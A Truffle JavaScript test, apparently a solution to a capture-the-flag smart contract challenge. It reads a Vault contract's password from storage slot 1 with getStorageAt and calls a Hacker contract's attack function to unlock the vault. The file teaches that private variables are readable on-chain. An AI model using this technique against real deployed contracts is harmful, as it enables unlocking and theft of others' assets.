const Hacker = artifacts.require("Hacker");
const Vault = artifacts.require("Vault");
const { expect } = require("chai");

/*
 * uncomment accounts to access the test accounts made available by the
 * Ethereum client
 * See docs: https://www.trufflesuite.com/docs/truffle/testing/writing-tests-in-javascript
 */
contract("Hacker", function ([_owner, _hacker]) {
  it("should unlock vault", async function () {
    const hackerContract = await Hacker.deployed();
    const targetContract = await Vault.deployed();

    // Check if the vault locked first
    let locked = await targetContract.locked();
    expect(locked).to.equal(true);

    // Read storage of the target contract
    const password = await web3.eth.getStorageAt(
      targetContract.address, // address of the contract
      1, // index of slot - password
    );

    // Use the password to unlock vault
    const result = await hackerContract.attack(targetContract.address, password, { from: _hacker });
    expect(result.receipt.status).to.equal(true);

    // Read lock status of the target contract
    locked = await targetContract.locked();
    expect(locked).to.equal(false);
  });
});
